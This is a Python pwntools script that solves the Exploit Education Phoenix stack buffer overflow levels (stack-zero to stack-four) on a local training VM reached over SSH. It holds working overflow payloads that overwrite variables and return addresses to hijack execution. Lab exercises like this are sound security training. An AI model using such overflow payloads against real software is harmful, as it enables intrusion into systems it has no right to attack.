import sys
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p8, p32, p64

HOSTNAME = "localhost"
PORT = 2222
USERNAME = "user"
PASSWORD = "user"
BINARY_NAME = None


def run(payload=None, args=None, env=None):
    conn = ssh(host=HOSTNAME, port=PORT, user=USERNAME, password=PASSWORD)
    cmd = [f'/opt/phoenix/amd64/{BINARY_NAME}']
    if args:
        cmd.append(args)
    p = conn.process(cmd, env=env)
    if payload:
        print(p.recv())
        print(f'Sending payload: {payload}')
        p.send(payload)
    print(p.recvall())

def stack_zero():
    run(payload=b'x'*64 + p8(0x31) + b'\n')

def stack_one():
    run(args=b'x'*64 + p32(0x496c5962) + b'\n')

def stack_two():
    run(env={'ExploitEducation': b'x'*64 + p32(0x0d0a090a) + b'\n'})

def stack_three():
    # gdb -> info functions -> print &complete_level
    run(payload=b'x'*64 + p64(0x40069d) + b'\n')

def stack_four():
    # buffer(64) + ret(8) + ? + rbp + eip
    run(payload=b'x'*64 + p64(0x1337) + p64(0x0) + p64(0x0) + p64(0x40061d) + b'\n')

if len(sys.argv) < 2:
    print(f'USAGE: python {sys.argv[0]} TASK_NAME')
    sys.exit()

BINARY_NAME = sys.argv[1]
name = BINARY_NAME.replace('-','_')
fn = globals().get(name)
if fn:
    fn()
else:
    print(f'Function {name} is not found')
